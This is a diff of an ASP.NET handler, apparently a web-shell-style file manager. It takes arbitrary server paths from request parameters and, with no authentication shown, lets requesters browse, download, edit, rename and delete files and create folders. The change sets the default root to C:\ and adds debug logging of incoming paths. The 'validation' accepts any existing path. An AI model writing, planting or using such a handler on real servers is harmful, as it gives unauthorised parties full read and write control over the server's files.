@@ -1,13 +1,13 @@
-<%@ WebHandler Language="C#" Class="FixedEnhancedFileBrowser" %>
+<%@ WebHandler Language="C#" Class="DebugEnhancedFileBrowser" %>
 using System;
 using System.Web;
 using System.IO;
 using System.Text;
 using System.Diagnostics;
 
-public class FixedEnhancedFileBrowser : IHttpHandler
+public class DebugEnhancedFileBrowser : IHttpHandler
 {
-    private const string DefaultFolder = "E:\HRNUML\assets\build\"; // Ya koi aapke server ki valid default directory
+    private const string DefaultFolder = @"C:\"; // Replace with valid default directory on your server
 
     public void ProcessRequest(HttpContext context)
     {
@@ -16,11 +16,15 @@ public class FixedEnhancedFileBrowser : IHttpHandler
         string action = context.Request["action"];
         string requestedPath = context.Request["path"];
 
-        // Strict validation for requestedPath
+        // Log incoming request parameters (for debugging)
+        Debug.WriteLine($"Action: {action}");
+        Debug.WriteLine($"Requested Path: {requestedPath}");
+
         string currentPath = ValidatePathOrDefault(requestedPath);
+        Debug.WriteLine($"Using path for browsing: {currentPath}");
 
         StringBuilder html = new StringBuilder();
-        html.Append("<html><head><title>Fixed Enhanced File Browser</title>");
+        html.Append("<html><head><title>Debug Enhanced File Browser</title>");
         html.Append("<style>body{font-family:Segoe UI,sans-serif;} " +
             "nav { margin-bottom: 20px; } " +
             "nav a { margin-right: 15px; text-decoration:none; font-weight:bold; } " +
@@ -79,18 +83,20 @@ public class FixedEnhancedFileBrowser : IHttpHandler
     private string ValidatePathOrDefault(string path)
     {
         if (string.IsNullOrWhiteSpace(path))
+        {
+            Debug.WriteLine("ValidatePathOrDefault: Empty path, returning default");
             return DefaultFolder;
+        }
         try
         {
-            // If directory exists, return as is
-            if (Directory.Exists(path))
-                return path;
-            // If it's a file, return directory containing file
-            if (File.Exists(path))
-                return Path.GetDirectoryName(path);
+            if (Directory.Exists(path)) return path;
+            if (File.Exists(path)) return Path.GetDirectoryName(path);
         }
-        catch { }
-        // Fallback
+        catch (Exception ex)
+        {
+            Debug.WriteLine("ValidatePathOrDefault error: " + ex.Message);
+        }
+        Debug.WriteLine("ValidatePathOrDefault: Invalid path, returning default");
         return DefaultFolder;
     }
 
@@ -106,8 +112,7 @@ public class FixedEnhancedFileBrowser : IHttpHandler
                 case "delete":
                     {
                         string target = context.Request["path"];
-                        if (string.IsNullOrWhiteSpace(target))
-                            return "<span class='error'>Delete failed: Path missing.</span>";
+                        if (string.IsNullOrWhiteSpace(target)) return "<span class='error'>Delete failed: Path missing.</span>";
                         if (File.Exists(target))
                         {
                             File.Delete(target);
@@ -127,13 +132,9 @@ public class FixedEnhancedFileBrowser : IHttpHandler
                     {
                         string target = context.Request["path"];
                         string newName = context.Request["newname"];
-                        if (string.IsNullOrWhiteSpace(target))
-                            return "<span class='error'>Rename failed: Path missing.</span>";
-                        if (string.IsNullOrWhiteSpace(newName))
-                            return "<span class='error'>Rename failed: New name missing.</span>";
-
+                        if (string.IsNullOrWhiteSpace(target)) return "<span class='error'>Rename failed: Path missing.</span>";
+                        if (string.IsNullOrWhiteSpace(newName)) return "<span class='error'>Rename failed: New name missing.</span>";
                         string newFullPath = Path.Combine(Path.GetDirectoryName(target), newName);
-
                         if (File.Exists(target))
                         {
                             File.Move(target, newFullPath);
@@ -153,14 +154,12 @@ public class FixedEnhancedFileBrowser : IHttpHandler
                     }
                 case "editform":
                     {
-                        // Handled in rendering, nothing here
                         return null;
                     }
                 case "saveedit":
                     {
                         string filePath = context.Request["path"];
-                        if (string.IsNullOrWhiteSpace(filePath))
-                            return "<span class='error'>Save failed: Path missing.</span>";
+                        if (string.IsNullOrWhiteSpace(filePath)) return "<span class='error'>Save failed: Path missing.</span>";
                         if (File.Exists(filePath))
                         {
                             string content = context.Request.Form["filecontent"];
@@ -176,8 +175,7 @@ public class FixedEnhancedFileBrowser : IHttpHandler
                 case "newfolder":
                     {
                         string folderName = context.Request["foldername"];
-                        if (string.IsNullOrWhiteSpace(folderName))
-                            return "<span class='error'>Folder creation failed: Folder name missing.</span>";
+                        if (string.IsNullOrWhiteSpace(folderName)) return "<span class='error'>Folder creation failed: Folder name missing.</span>";
                         string newDir = Path.Combine(currentPath, folderName);
                         if (!Directory.Exists(newDir))
                         {
@@ -195,7 +193,6 @@ public class FixedEnhancedFileBrowser : IHttpHandler
         {
             return $"<span class='error'>Error: {HttpUtility.HtmlEncode(ex.Message)}</span>";
         }
-
         return null;
     }
 
@@ -339,7 +336,7 @@ public class FixedEnhancedFileBrowser : IHttpHandler
         if (bytes < 1024 * 1024 * 1024) return (bytes / (1024.0 * 1024)).ToString("0.0") + " MB";
         return (bytes / (1024.0 * 1024 * 1024)).ToString("0.0") + " GB";
     }
-    
+
     private string DownloadFile(HttpContext context, string file)
     {
         try
@@ -355,7 +352,7 @@ public class FixedEnhancedFileBrowser : IHttpHandler
             context.Response.TransmitFile(file);
             context.Response.Flush();
             context.Response.End();
-            return null; // never reached after Response.End()
+            return null; // won't reach here
         }
         catch (Exception ex)
         {
